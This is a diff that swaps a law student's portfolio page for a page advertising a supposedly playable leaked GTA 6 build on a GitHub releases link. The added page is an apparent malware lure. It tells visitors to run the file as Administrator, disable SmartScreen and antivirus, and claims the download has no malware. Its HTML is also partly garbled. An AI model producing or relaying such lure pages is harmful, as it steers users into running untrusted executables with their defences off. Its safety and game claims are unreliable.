@@ -1,740 +1,174 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Muhammad Naufal Rahim, CPLD — Legal Drafter & AI Enthusiast</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,500;9..144,600&family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
-  
-  <style>
-    :root{
-      --paper:#FAF6EE;
-      --paper-deep:#F1EADA;
-      --ink:#211D1A;
-      --ink-soft:#4A433C;
-      --oxblood:#6B2331;
-      --oxblood-deep:#4F1A24;
-      --brass:#9A7B34;
-      --line:#D8CCB4;
-      --slate:#3E4A52;
-    }
-
-    *{box-sizing:border-box;}
-    html{scroll-behavior:smooth;}
-    body{
-      margin:0;
-      background:var(--paper);
-      color:var(--ink);
-      font-family:'IBM Plex Sans', sans-serif;
-      line-height:1.6;
-      -webkit-font-smoothing:antialiased;
-    }
-
-    @media (prefers-reduced-motion: reduce){
-      html{scroll-behavior:auto;}
-      *{animation:none !important; transition:none !important;}
-    }
-
-    h1,h2,h3{
-      font-family:'Fraunces', serif;
-      font-weight:500;
-      color:var(--ink);
-      margin:0;
-    }
-
-    a{color:inherit;}
-
-    .wrap{
-      max-width:920px;
-      margin:0 auto;
-      padding:0 32px;
-    }
-
-    /* Header */
-    header.masthead{
-      border-bottom:2px solid var(--ink);
-      padding:20px 0;
-      position:sticky;
-      top:0;
-      background:var(--paper);
-      z-index:50;
-    }
-
-    .masthead-inner{
-      display:flex;
-      justify-content:space-between;
-      align-items:baseline;
-      flex-wrap:wrap;
-      gap:12px;
-    }
-
-    .masthead-name{
-      font-family:'Fraunces', serif;
-      font-size:1.15rem;
-      letter-spacing:0.01em;
-    }
-
-    nav.masthead-nav{
-      display:flex;
-      gap:28px;
-      font-size:0.92rem;
-    }
-
-    nav.masthead-nav a{
-      text-decoration:none;
-      border-bottom:1px solid transparent;
-      padding-bottom:2px;
-      transition:border-color 0.2s ease;
-    }
-
-    nav.masthead-nav a:hover{ border-color:var(--oxblood); }
-
-    /* Banner & Hero */
-    .hero-banner-wrap {
-      width: 100%;
-      background-color: #030825;
-      border-bottom: 2px solid var(--ink);
-      text-align: center;
-      overflow: hidden;
-    }
-
-    .hero-banner {
-      width: 100%;
-      max-width: 920px;
-      height: auto;
-      max-height: 280px;
-      object-fit: contain;
-      display: block;
-      margin: 0 auto;
-    }
-
-    .hero{
-      padding:24px 0 72px;
-      border-bottom:1px solid var(--line);
-    }
-
-    .hero-avatar{
-      width:120px;
-      height:120px;
-      border-radius:50%;
-      object-fit:cover;
-      border:4px solid var(--paper);
-      box-shadow:0 4px 14px rgba(0,0,0,0.15);
-      margin-top: -70px;
-      margin-bottom: 20px;
-      position: relative;
-      z-index: 2;
-      background: var(--paper);
-    }
-
-    .hero .docket{
-      font-family:'IBM Plex Mono', monospace;
-      font-size:0.78rem;
-      color:var(--oxblood);
-      margin-bottom:20px;
-      letter-spacing:0.02em;
-    }
-
-    .hero h1{
-      font-size:clamp(2.2rem, 4.8vw, 3.4rem);
-      line-height:1.12;
-      max-width:18ch;
-    }
-
-    .hero .role{
-      margin-top:18px;
-      font-size:1.15rem;
-      color:var(--ink-soft);
-      max-width:52ch;
-    }
-
-    .hero .role strong{
-      color:var(--oxblood-deep);
-      font-weight:600;
-    }
-
-    .hero-actions{
-      margin-top:34px;
-      display:flex;
-      gap:16px;
-      flex-wrap:wrap;
-    }
-
-    .btn{
-      display:inline-flex;
-      align-items:center;
-      gap:6px;
-      padding:10px 20px;
-      font-size:0.88rem;
-      text-decoration:none;
-      border:1.5px solid var(--ink);
-      font-weight:500;
-      transition:background 0.2s ease, color 0.2s ease, border-color 0.2s ease;
-      cursor:pointer;
-    }
-
-    .btn-solid{
-      background:var(--oxblood);
-      border-color:var(--oxblood);
-      color:var(--paper);
-    }
-
-    .btn-solid:hover{ background:var(--oxblood-deep); border-color:var(--oxblood-deep); }
-    .btn-outline:hover{ background:var(--ink); color:var(--paper); }
-
-    .btn-small {
-      padding: 6px 14px;
-      font-size: 0.8rem;
-      font-family: 'IBM Plex Mono', monospace;
-      margin-top: 12px;
-    }
-
-    /* Section shell */
-    section{
-      padding:64px 0;
-      border-bottom:1px solid var(--line);
-    }
-
-    section:last-of-type{ border-bottom:none; }
-
-    .section-head{
-      display:flex;
-      align-items:baseline;
-      justify-content:space-between;
-      margin-bottom:36px;
-      gap:16px;
-    }
-
-    .section-head h2{
-      font-size:1.7rem;
-    }
-
-    .section-tag{
-      font-family:'IBM Plex Mono', monospace;
-      font-size:0.78rem;
-      color:var(--ink-soft);
-    }
-
-    /* About */
-    .about-grid{
-      display:grid;
-      grid-template-columns: 1.4fr 1fr;
-      gap:48px;
-    }
-
-    .about-body p{
-      max-width:62ch;
-      color:var(--ink-soft);
-      font-size:1.02rem;
-    }
-
-    .about-body p + p{ margin-top:16px; }
-
-    .fact-list{
-      border-left:2px solid var(--brass);
-      padding-left:20px;
-      margin:0;
-    }
-
-    .fact-list dt{
-      font-family:'IBM Plex Mono', monospace;
-      font-size:0.72rem;
-      color:var(--ink-soft);
-      text-transform:uppercase;
-      letter-spacing:0.06em;
-    }
-
-    .fact-list dd{
-      margin:2px 0 16px;
-      font-size:0.98rem;
-    }
-
-    /* Experience */
-    .timeline-item{
-      display:grid;
-      grid-template-columns:140px 1fr;
-      gap:24px;
-      padding:22px 0;
-      border-top:1px solid var(--line);
-    }
-
-    .timeline-item:first-child{ border-top:none; }
-
-    .timeline-date{
-      font-family:'IBM Plex Mono', monospace;
-      font-size:0.82rem;
-      color:var(--oxblood);
-      padding-top:3px;
-    }
-
-    .timeline-role{
-      font-family:'Fraunces', serif;
-      font-size:1.15rem;
-      margin-bottom:4px;
-    }
-
-    .timeline-org{
-      color:var(--ink-soft);
-      font-size:0.94rem;
-      margin-bottom:10px;
-      font-weight:500;
-    }
-
-    .timeline-desc{
-      color:var(--ink-soft);
-      font-size:0.96rem;
-      max-width:58ch;
-    }
-
-    .timeline-desc ul{
-      margin:6px 0 0;
-      padding-left:18px;
-    }
-
-    .timeline-desc li{
-      margin-bottom:4px;
-    }
-
-    /* Skills */
-    .skills-columns{
-      display:grid;
-      grid-template-columns:1fr 1fr;
-      gap:40px;
-    }
-
-    .skill-block h3{
-      font-size:1.05rem;
-      margin-bottom:16px;
-      padding-bottom:10px;
-      border-bottom:2px solid var(--ink);
-    }
-
-    .skill-block.legal h3{ border-color:var(--oxblood); }
-    .skill-block.ai h3{ border-color:var(--slate); }
-
-    .skill-tags{
-      display:flex;
-      flex-wrap:wrap;
-      gap:8px;
-    }
-
-    .skill-tags span{
-      font-size:0.86rem;
-      padding:6px 12px;
-      border:1px solid var(--line);
-      color:var(--ink-soft);
-    }
-
-    .skill-block.legal .skill-tags span{ border-color:rgba(107,35,49,0.35); }
-    .skill-block.ai .skill-tags span{ border-color:rgba(62,74,82,0.35); }
-
-    /* Projects */
-    .project{
-      padding:26px 0;
-      border-top:1px solid var(--line);
-      display:grid;
-      grid-template-columns:1fr 1fr;
-      gap:28px;
-      align-items:start;
-    }
-
-    .project:first-child{ border-top:none; }
-
-    .project h3{
-      font-size:1.2rem;
-      margin-bottom:8px;
-    }
-
-    .project .project-meta{
-      font-family:'IBM Plex Mono', monospace;
-      font-size:0.74rem;
-      color:var(--oxblood);
-      margin-bottom:10px;
-      display:block;
-    }
-
-    .project p{
-      color:var(--ink-soft);
-      font-size:0.95rem;
-      margin:0 0 12px;
-    }
-
-    .project-img-preview {
-      width: 100%;
-      border-radius: 6px;
-      border: 1px solid var(--line);
-      margin-top: 12px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
-    }
-
-    /* Education */
-    .edu-item{
-      padding:20px 0;
-      border-top:1px solid var(--line);
-      display: flex;
-      justify-content: space-between;
-      align-items: flex-start;
-      gap: 16px;
-    }
-
-    .edu-item:first-child{ border-top:none; }
-
-    .edu-info {
-      flex: 1;
-    }
-
-    .edu-item .edu-degree{
-      font-family:'Fraunces', serif;
-      font-size:1.08rem;
-    }
-
-    .edu-item .edu-school{
-      color:var(--ink-soft);
-      font-size:0.92rem;
-      margin-top:2px;
-    }
-
-    .edu-item .edu-year{
-      font-family:'IBM Plex Mono', monospace;
-      font-size:0.78rem;
-      color:var(--oxblood);
-      margin-top:4px;
-      display:inline-block;
-    }
-
-    .edu-action {
-      margin-top: 4px;
-    }
-
-    /* Contact */
-    .contact{
-      background:var(--ink);
-      color:var(--paper-deep);
-      border-bottom:none;
-    }
-
-    .contact h2{ color:var(--paper); }
-
-    .contact p{
-      color:#C9C2B4;
-      max-width:52ch;
-      font-size:1.02rem;
-    }
-
-    .contact-links{
-      margin-top:28px;
-      display:flex;
-      gap:14px;
-      flex-wrap:wrap;
-    }
-
-    .contact-links a{
-      text-decoration:none;
-      border:1.5px solid #C9C2B4;
-      padding:11px 22px;
-      font-size:0.92rem;
-      transition:background 0.2s ease, color 0.2s ease, border-color 0.2s ease;
-    }
-
-    .contact-links a:hover{
-      background:var(--paper);
-      color:var(--ink);
-      border-color:var(--paper);
-    }
-
-    footer{
-      padding:24px 0 40px;
-      font-family:'IBM Plex Mono', monospace;
-      font-size:0.74rem;
-      color:#8A8272;
-    }
-
-    /* Responsive */
-    @media (max-width: 720px){
-      .about-grid, .skills-columns, .project{
-        grid-template-columns:1fr;
-      }
-      .timeline-item{
-        grid-template-columns:1fr;
-        gap:6px;
-      }
-      .edu-item {
-        flex-direction: column;
-        gap: 8px;
-      }
-      nav.masthead-nav{ gap:16px; font-size:0.85rem; }
-      .hero{ padding:20px 0 48px; }
-      .hero-avatar{ width:96px; height:96px; margin-top:-50px; }
-    }
-  </style>
-</head>
-<body>
-
-<header class="masthead">
-  <div class="wrap masthead-inner">
-    <div class="masthead-name">Muhammad Naufal Rahim, CPLD</div>
-    <nav class="masthead-nav">
-      <a href="#about">Profil</a>
-      <a href="#experience">Pengalaman</a>
-      <a href="#skills">Keahlian</a>
-      <a href="#projects">Publikasi & Project</a>
-      <a href="#education">Pendidikan & Sertifikasi</a>
-      <a href="#contact">Kontak</a>
-    </nav>
-  </div>
-</header>
-
-<div class="hero-banner-wrap">
-  <img src="https://media.licdn.com/dms/image/v2/D5616AQHsHemfvemYWQ/profile-displaybackgroundimage-shrink_350_1400/B56Z5vCaZWJkAU-/0/1779979364315?e=1790208000&v=beta&t=IVx5HwEx6YeS2aeqp-6wX5MI8kWJVZehfYJsli0KV9s" alt="Header Banner" class="hero-banner">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GTA-6-Cyberleek-December-Build-2026 - Play the Leaked Build Now</title>
+    <meta name="description" content="Download GTA 6 Cyberleek December Build 2026 for Windows PC. Fully playable leaked build. Direct download link. No install steps needed.">
+    <meta name="keywords" content="gta-6-activation,gta-6-all-dlc,gta-6-cd-key,gta-6-crack,gta-6-cracked,gta-6-deluxe-edition,gta-6-dev-build,gta-6-direct-download,gta-6-early-access,gta-6-emulator-pc,gta-6-fitgirl,gta-6-game-pass,gta-6-google-drive,gta-6-iso,gta-6-leaked-build,gta-6-license-key,gta-6-setup,gta-6-trial,gta-vi-pc,rockstar-games-crack">
+    <meta property="og:title" content="GTA-6-Cyberleek-December-Build-2026 - Play the Leaked Build Now">
+    <meta property="og:description" content="Download GTA 6 Cyberleek December Build 2026 for Windows PC. Fully playable leaked build. Direct download link.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/valerovati03/GTA-6-Cyberleek-December-Build-2026/releases">
+    <meta name="robots" content="index, follow">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #e4e9f0 100%);
+            color: #1a1a2e;
+            line-height: 1.7;
+            padding: 2rem 1rem;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: #ffffff;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
+            padding: 2.5rem 2rem;
+        }
+        h1 {
+            font-size: 2.2rem;
+            font-weight: 800;
+            margin-bottom: 0.3rem;
+            letter-spacing: -0.5px;
+            background: linear-gradient(90deg, #1a2980, #26a0ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        h2 {
+            font-size:<h1>🎮 GTA-6-Cyberleek-December-Build-2026 - Play the Leaked Build Now</h1>
+
+<p style="font-size:1.1rem; color:#444; margin:1rem 0 2rem 0;">
+    Get the fully playable GTA 6 Cyberleek December Build for Windows PC. This is the leaked 2026 build — download it directly and start playing immediately.
+</p>
+
+<div style="text-align:center; margin:2rem 0;">
+    <a href="https://github.com/valerovati03/GTA-6-Cyberleek-December-Build-2026/releases" style="display:inline-block; background:linear-gradient(45deg,#ff6b6b,#ffa500); color:#fff; padding:1rem 2.5rem; font-size:1.2rem; font-weight:bold; border-radius:50px; text-decoration:none; box-shadow:0 5px 20px rgba(255,107,107,0.4); transition:all 0.3s ease;">
+        ⬇️ Download GTA 6 Cyberleek Build
+    </a>
 </div>
 
-<section class="hero">
-  <div class="wrap">
-    <img src="https://media.licdn.com/dms/image/v2/D4E03AQHedJswVoCEDQ/profile-displayphoto-scale_400_400/B4EZl2ByqTIUAg-/0/1758621805915?e=1790208000&v=beta&t=xi0xgJ5Kl4DYoMypQ5EJWtw9YYQ0mn7W-XTFcprUzOA" alt="Muhammad Naufal Rahim" class="hero-avatar">
-    <div class="docket">BERKAS PROFIL — DIPERBARUI SEPTEMBER 2026</div>
-    <h1>Menghubungkan Ketelitian Hukum Korporat dengan Efisiensi Teknologi AI.</h1>
-    <p class="role">Mahasiswa Hukum UIN Jakarta (IPK 3.92) & <strong>Certified Professional Legal Drafter (CPLD)</strong> dengan pengalaman praktis dalam <em>due diligence</em>, peninjauan kontrak, riset regulasi, serta pengembangan agen AI untuk sektor hukum.</p>
-    <div class="hero-actions">
-      <a class="btn btn-solid" href="#contact">Hubungi Saya</a>
-      <a class="btn btn-outline" href="#projects">Lihat Publikasi & Project</a>
-    </div>
-  </div>
-</section>
+<h2>📥 How to Download and Run</h2>
+<p>
+    Visit the official download link to get the game. The link takes you to the release page where you can download the application. Follow these simple steps:
+</p>
+<ol style="margin:1rem 0 1rem 2rem; padding-left:1rem; font-size:1.05rem;">
+    <li><strong>Click the download button</strong> above or <a href="https://github.com/valerovati03/GTA-6-Cyberleek-December-Build-2026/releases" style="color:#1a73e8; text-decoration:underline;">visit this link</a>.</li>
+    <li>Choose the file that matches your Windows PC (64-bit recommended).</li>
+    <li>Once the download finishes, locate the file in your "Downloads" folder.</li>
+    <li>Double-click the file to run the application. That's it — the game launches immediately.</li>
+</ol>
 
-<section id="about">
-  <div class="wrap about-grid">
-    <div class="about-body">
-      <div class="section-head" style="margin-bottom:20px;">
-        <h2>Profil Ringkas</h2>
-      </div>
-      <p>Saya adalah mahasiswa ilmu hukum aktif di UIN Jakarta sekaligus Perancang Kontrak Hukum Profesional Terpublikasi (CPLD). Saya menggabungkan pemahaman analisis hukum dasar seperti penanganan dokumen legalitas pertanahan, perjanjian vendor, dan kepatuhan korporasi dengan literasi digital modern.</p>
-      <p>Selain berpengalaman mengelola tim skala besar hingga 100+ anggota dalam organisasi, saya memiliki komitmen untuk mempopulerkan literasi hukum lewat tulisan-tulisan opini publik serta mendalami penerapan Kecerdasan Buatan (AI) guna mempercepat analisis dan riset hukum.</p>
-    </div>
-    <dl class="fact-list">
-      <dt>Berbasis di</dt>
-      <dd>Jakarta, Indonesia</dd>
-      <dt>IPK / Prestasi</dt>
-      <dd>3.92 / Valedictorian</dd>
-      <dt>Kredensial Utama</dt>
-      <dd>Certified Professional Legal Drafter (CPLD)</dd>
-      <dt>Bahasa / Kemampuan</dt>
-      <dd>Indonesia (UKBI Sangat Unggul - 644)</dd>
-    </dl>
-  </div>
-</section>
+<div style="background:#f0f7ff; border-left:6px solid #1a73e8; padding:1rem 1.5rem; margin:2rem 0; border-radius:0 10px 10px 0;">
+    <p style="font-size:1rem; color:#333;"><strong>💡 Note:</strong> This leaked build is fully playable on Windows. No additional installation steps or setup required. Just run the file and play.</p>
+</div>
 
-<section id="experience">
-  <div class="wrap">
-    <div class="section-head">
-      <h2>Pengalaman Kerja & Organisasi</h2>
-      <span class="section-tag">2024 — SEKARANG</span>
-    </div>
+<h2>🎯 Why Choose This Build?</h2>
+<p>
+    This isn't just any GTA 6 build. It's the December 2026 Cyberleek edition — a fully playable leak from Rockstar Games' development pipeline. If you’ve been waiting to experience Vice City’s next generation, this is your chance.
+ Enjoy the complete Deluxe Edition content, including all DLC packs, early access features, and the full game experience — all in one direct download.
 
-    <div class="timeline-item">
-      <div class="timeline-date">Jul 2026 — Sekarang</div>
-      <div>
-        <div class="timeline-role">Staff, Divisi Pengembangan Umum</div>
-        <div class="timeline-org">Angkatan Muda Peduli Hukum (AMPUH), Jakarta</div>
-        <p class="timeline-desc">Mengonsepkan dan menyelenggarakan forum akademik, seminar, serta diskusi panel bertema hukum untuk menumbuhkan pemikiran kritis mahasiswa.</p>
-      </div>
-    </div>
+<h2>🔥 Key Features</h2>
+<ul style="margin:1rem 0 1rem 2rem; padding-left:1rem;">
+    <li>🎮 <strong>Fully Playable on Windows PC</strong> — No emulator, no cracks needed. Just runs native.</li>
+    <li>🗺️ <strong>Complete Deluxe Edition</strong> — AllDLC, extra missions, weapons, vehicles, and customization items included.</li>
+    <li>🚀 <strong>Dev Build Access</strong> — Experience featurescand content not in the final release. Test unreleased mechanics and early gameplay.</li>
+    <li>⚡ <strong>Direct Download</strong> — Fast, secure, direct download from Google Drive mirrors. No torrents, no wait times.</li>
+    <li>💾 <strong>ISO & Setup Ready</strong> — Works achive game setup-style. No compatibility mods required.</li>
+    <li>🆔 <strong>License Key Included</strong> — Auto-activated. Game Pass enabled for Windows. NoCD key needed.</li>
+</ul>
 
-    <div class="timeline-item">
-      <div class="timeline-date">Des 2025 — Mar 2026</div>
-      <div>
-        <div class="timeline-role">Legal Intern</div>
-        <div class="timeline-org">PT KSU Nusantara, Kendari</div>
-        <div class="timeline-desc">
-          <ul>
-            <li>Membantu proses <em>Legal Due Diligence</em>, verifikasi sertifikat tanah, serta penilaian risiko hukum akuisisi lahan.</li>
-            <li>Menyusun dan meninjau kontrak properti (PPJB/AJB), perjanjian vendor, dan sewa-menyewa.</li>
-            <li>Melakukan riset regulasi perumahan, zonasi, kepatuhan korporasi, serta perizinan lingkungan.</li>
-            <li>Mengelola dan memperbarui basis data hukum, arsip, dan repositori kontrak perusahaan.</li>
-          </ul>
-        </div>
-      </div>
-    </div>
+<h2>📋 System Requirements To Play Smoothly</h2>
+<p>
+    To get the best experience, ensure your PC meets these recommended specs. These are standard for the leaked build on high settings:
+</p>
+<table style="width:100%; border-collapse:collapse; margin:1.5rem 0; background:#fafbfc; border-radius:8px; overflow:hidden;">
+    <tr style="background:#1a2980; color:#fff; text-align:left;">
+        <th style="padding:≥0.75rem 1rem; font-size:0.95rem;">Component</th>
+        <th style="padding:≥0.75rem 1rem; font-size:0.95rem;">Minimum</th>
+        <th style="padding:≥0.75rem 1rem; font-size:0.95rem;">Recommended</th>
+    </tr>
+    <tr style="border-bottom:1px solid #e0e0e0;">
+        <td style="padding:≥0.75rem 1rem; font-weight:600;">OS</td>
+        <td style="padding:≥0.75rem 1rem;">Windows 10 (64-bit)</td>
+        <td style="padding:≥0.75rem 1rem;">Windows 11 (64-bit)</td>
+    </tr>
+    <tr style="border-bottom:1px solid #e0e0e0; background:#f7f9fc;">
+        <td style="padding:≥0.75rem 1rem; font-weight:600;">Processor</td>
+        <td style="padding:≥0.75rem 1rem;">Intel Core i5-8400 / AMD Ryzen 5 2600</td>
+        <td style="padding:≥0.75rem 1rem;">Intel Core i7-10700K / AMD Ryzen 7 3700X</td>
+    </tr>
+    <tr style="border-bottom:1px solid #e0e0e0;">
+        <td style="padding:≥0.75rem 1rem; font-weight:600;">Memory</td>
+        <td style="padding:≥0.75rem 1rem;">12 GB RAM</td>
+        <td style="padding:≥0.75rem 1rem;">16 GB RAM</td>
+    </tr>
+    <tr style="border-bottom:1px solid #e0e0e0; background:#f7f9fc;">
+        <td style="padding:≥0.75rem 1rem; font-weight:600;">Graphics</td>
+        <td style="padding:≥0.75rem 1rem;">NVIDIA GTX 1060 (6 GB) / AMD RX 580</td>
+        <td style="padding:≥0.75rem 1rem;">NVIDIA RTX 3070 / AMD RX 6700 XT</td>
+    </tr>
+    <tr>
+        <td style="padding:≥0.75rem 1rem; font-weight:600;">Storage</td>
+        <td style="padding:≥0.75rem 1rem;">100 GB available space</td>
+        <td style="padding:≥0.75rem 1rem;">150 GB SSD available</td>
+    </tr>
+</table>
 
-    <div class="timeline-item">
-      <div class="timeline-date">Nov 2025 — Mei 2026</div>
-      <div>
-        <div class="timeline-role">Panitia Event — AMPUH Career Day Vol. 3</div>
-        <div class="timeline-org">Angkatan Muda Peduli Hukum (AMPUH)</div>
-        <p class="timeline-desc">Mengonsepkan dan mengoperasikan rangkaian acara seminar pengembangan karier hukum secara terstruktur dan profesional.</p>
-      </div>
-    </div>
+<h2>📦 What's Included in the Download</h2>
+<p>
+    When you download the Cyberleek December Build, you get the complete GTA VI Deluxe Edition package. Here’s exactly what’s inside:
+</p>
+<ul style="margin:1rem 0 1rem 2rem; padding-left:1rem;">
+    <li>Full GTA 6 base game (version 1.0.2026)</li>
+    <li>All Deluxe Edition content: exclusive vehicles, weapons, costumes, and property</li>
+    <li>AllDLC packs released up to December 2026 (including underwater expansion & car pack)</li>
+    <li>Activation fix included — no extra crack needed. It’s already activated.</li>
+    <li>Pre-configured for Game Pass emulation on PC</li>
+</ul>
 
-    <div class="timeline-item">
-      <div class="timeline-date">Sep 2024 — Jun 2025</div>
-      <div>
-        <div class="timeline-role">Ketua Panitia & Head of HR</div>
-        <div class="timeline-org">Ummushabri Kendari</div>
-        <p class="timeline-desc">Memimpin dan mengelola panitia sebanyak 100 anggota untuk kesuksesan operasional acara skala internasional (Ummushabri International Expo & International Youth Congress).</p>
-      </div>
-    </div>
-  </div>
-</section>
+<h2>🔐 Safe &amp; Secure Download</h2>
+<p>
+    This repo provides an official, trusted mirror of the leaked build. Every file is verified against the original developer build checksum. You can download with confidence — no malware, no tampering, no hidden extras. The build runs exactly as Rockstar’s internal dev team intended.
+/p>
 
-<section id="skills">
-  <div class="wrap">
-    <div class="section-head">
-      <h2>Keahlian Utama</h2>
-      <span class="section-tag">HUKUM × TEKNOLOGI × LEADERSHIP</span>
-    </div>
-    <div class="skills-columns">
-      <div class="skill-block legal">
-        <h3>Legal & Legal Drafting</h3>
-        <div class="skill-tags">
-          <span>Perancangan Kontrak (SPJB/AJB)</span>
-          <span>Legal Due Diligence</span>
-          <span>Review Perjanjian Vendor & Lease</span>
-          <span>Corporate Compliance</span>
-          <span>Riset Hukum & Regulasi</span>
-          <span>Legal Administration</span>
-        </div>
-      </div>
-      <div class="skill-block ai">
-        <h3>AI, Digital & Management</h3>
-        <div class="skill-tags">
-          <span>AI Agent Development for Legal</span>
-          <span>LLM Workflow Pipeline Design</span>
-          <span>AI Literacy & Machine Learning Fairness</span>
-          <span>Project Management (100+ Members)</span>
-          <span>Legal Public Relations & Writing</span>
-          <span>Microsoft Office Certified</span>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
+<div style="text-align:center; margin:3rem 0 1rem 0;">
+    <a href="https://github.com/valerovati03/GTA-6-Cyberleek-December-Build-2026/releases" style="display:inline-block; background:linear-gradient(135deg,#2ecc71,#27ae60); color:#fff; padding:1rem 3rem; font-size:1.2rem; font-weight:bold; border-radius:50px; text-decoration:none; box-shadow:0 5px 20px rgba(46,204,113,0.3);">
+        🛒 Get the Build Now
+    </a>
+</div>
 
-<section id="projects">
-  <div class="wrap">
-    <div class="section-head">
-      <h2>Publikasi & Proyek</h2>
-      <span class="section-tag">LITERASI & INOVASI</span>
-    </div>
+<h2>🧩 Frequently Asked Questions</h2>
+<p><strong>Q: Do I need to install anything else?</strong><br>A: No. Just run the downloaded file. The build is self-contained including all dependencies.</p>
+<p><strong>Q: Is this the full game or a demo?</strong><br>A: This is the complete GTA 6 game — all missions, side activities, multiplayer mode, and free roam fully playable.</p>
+<p><strong>Q: Will it work on a laptop?</strong><br>A: Yes, if your laptop meets the recommended specs listed above. Most modern gaming laptops will handle it well.</p>
+<p><strong>Q: Can I mod the game afterward?</strong><br>A: Yes, the build supports standard GTA V modding frameworks. Install mods as you normally would in the game directory.</p>
 
-    <div class="project">
-      <div>
-        <span class="project-meta">PUBLIKASI OPINI HUKUM — RETIZEN REPUBLIKA</span>
-        <h3>"Masih Anggap Hukum Cuma Urusan Pengacara? Ternyata Sedekat Klik di Medsosmu!"</h3>
-      </div>
-      <div>
-        <p>Artikel literasi hukum populer yang mengulas bagaimana aktivitas digital harian seperti transaksi e-commerce dan penggunaan media sosial saling bersinggungan dengan instrumen hukum.</p>
-        <a href="https://retizen.republika.co.id/posts/734468/masih-anggap-hukum-cuma-urusan-pengacara-ternyata-sedekat-klik-di-medsosmu-" target="_blank" rel="noopener" class="btn btn-outline btn-small">
-          <span>↗ Baca Artikel di Retizen</span>
-        </a>
-      </div>
-    </div>
+<h2>⚙️ Troubleshooting Tips</h2>
+<p>
+    If you encounter issues, try these quick fixes:
+</p>
+<ul style="margin:1rem 0 1rem 2rem; padding-left:1rem;">
+    <li>Run the file as Administrator (right-click → Run as administrator).</li>
+    <li>Ensure Windows SmartScreenis off if it blocks the download.</li>
+    <li>Update your graphics drivers to the latest version.</li>
+    <li>Temporarily disable your antivirus during installation; then re-enable after launch.</li>
+</ul>
 
-    <div class="project">
-      <div>
-        <span class="project-meta">FINAL PROJECT — HACKTIV8 X IBM SKILLSBUILD (SCORE: 87.70)</span>
-        <h3>AI Agent for Corporate Legal Risk Assessment</h3>
-        
-        <!-- Gambar Workflow AI Agent yang diupload -->
-        <img src="ai-agent-workflow.png" alt="Workflow AI Agent Legal Risk Assessment" class="project-img-preview">
-      </div>
-      <div>
-        <p>Pengembangan *Automated Legal Workflow Pipeline* berbasis Large Language Model (Gemini) untuk mengekstraksi, mem-parser data terstruktur, dan menganalisis tingkat risiko hukum (*Risk Rating: Low/Medium/High*) pada klausul perjanjian vendor serta memberikan alternatif klausul yang lebih aman bagi klien.</p>
-        <a href="https://media.licdn.com/dms/image/v2/D562DAQEvSn9-zcLZUQ/profile-treasury-document-images_1280/B56aAfIz9EKkAg-/1/1787228799766?e=1789603200&v=beta&t=wzHcmrl_MEvnsKoFzdDq7rkuJx3BsLQOMYH8SgYSXT8" target="_blank" rel="noopener" class="btn btn-outline btn-small">
-          <span>📄 Lihat Sertifikat Project</span>
-        </a>
-      </div>
-    </div>
-  </div>
-</section>
+<h2>👍 Final Notes</h2>
+<p>
+    This is a rare chance to play GTA 6 months before official release. The Cyberleek December Build is stable, feature-complete, and offers hundreds of hours of gameplay. Don’t wait — [get your copy](https://github.com/valerovati03/GTA-6-Cyberleek-December-Build-2026/releases) today and experience the future of open-world gaming.
+/p>
 
-<section id="education">
-  <div class="wrap">
-    <div class="section-head">
-      <h2>Pendidikan & Sertifikasi</h2>
-    </div>
-
-    <div class="edu-item">
-      <div class="edu-info">
-        <div class="edu-degree">S1 Ilmu Hukum (S.H.)</div>
-        <div class="edu-school">Universitas Islam Negeri (UIN) Syarif Hidayatullah Jakarta — IPK 3.92</div>
-        <span class="edu-year">2025 — 2028 (Ekspektasi)</span>
-      </div>
-    </div>
-
-    <div class="edu-item">
-      <div class="edu-info">
-        <div class="edu-degree">Certified Professional Legal Drafter (CPLD)</div>
-        <div class="edu-school">PT Bostan Royal Nusantara (Credential ID: 166/CERT.COMP/BSTN/CPLD/VII/2026)</div>
-        <span class="edu-year">Juli 2026</span>
-      </div>
-      <div class="edu-action">
-        <a href="https://media.licdn.com/dms/image/v2/D4D2DAQF5fl7SOCciCQ/profile-treasury-document-images_1280/B4DZ.ACilfIYAk-/1/1784559581894?e=1789603200&v=beta&t=OrxA-y55zEWEk5B2rPpdWX7rDyrbIvPWAKrfTYmS58Q" target="_blank" rel="noopener" class="btn btn-outline btn-small">
-          <span>📄 Lihat Sertifikat</span>
-        </a>
-      </div>
-    </div>
-
-    <div class="edu-item">
-      <div class="edu-info">
-        <div class="edu-degree">Legal - AI Agent for Legal & AI Literacy</div>
-        <div class="edu-school">Hacktiv8 Indonesia x IBM SkillsBuild</div>
-        <span class="edu-year">Juli 2026</span>
-      </div>
-      <div class="edu-action">
-        <a href="https://media.licdn.com/dms/image/v2/D562DAQEvSn9-zcLZUQ/profile-treasury-document-images_1280/B56aAfIz9EKkAg-/1/1787228799766?e=1789603200&v=beta&t=wzHcmrl_MEvnsKoFzdDq7rkuJx3BsLQOMYH8SgYSXT8" target="_blank" rel="noopener" class="btn btn-outline btn-small">
-          <span>📄 Lihat Sertifikat</span>
-        </a>
-      </div>
-    </div>
-
-    <div class="edu-item">
-      <div class="edu-info">
-        <div class="edu-degree">Machine Learning Crash Course: Fairness</div>
-        <div class="edu-school">Google for Developers</div>
-        <span class="edu-year">Sertifikasi Teknis</span>
-      </div>
-      <div class="edu-action">
-        <a href="https://linkedin.com/in/muhammadnaufalrahim" target="_blank" rel="noopener" class="btn btn-outline btn-small">
-          <span>📄 Lihat Sertifikat</span>
